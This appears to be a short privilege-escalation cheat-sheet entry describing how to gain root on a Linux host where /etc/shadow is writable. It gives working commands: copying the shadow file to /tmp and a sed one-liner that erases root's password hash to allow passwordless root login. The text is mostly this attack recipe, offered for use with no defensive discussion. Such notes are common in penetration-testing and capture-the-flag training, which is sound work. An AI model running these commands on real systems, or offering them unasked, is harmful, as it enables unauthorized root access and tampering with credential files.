# Privilege Escalation Method - Writable /etc/shadow

## Vulnerability  
The vulnerability stems from write permissions on `/etc/shadow`, allowing modification or replacement of password hashes and escalation to root privileges.

## Conditions
- `/etc/shadow` is writable by the compromised user 

## Exploitation and Key Commands

- Backup the shadow file:
```bash
cp /etc/shadow /tmp/shadow.bak
```
- Remove the root password hash, this allows for passwordless login:
```bash
sed -i 's/^root:[^:]*/root::/' /etc/shadow
```
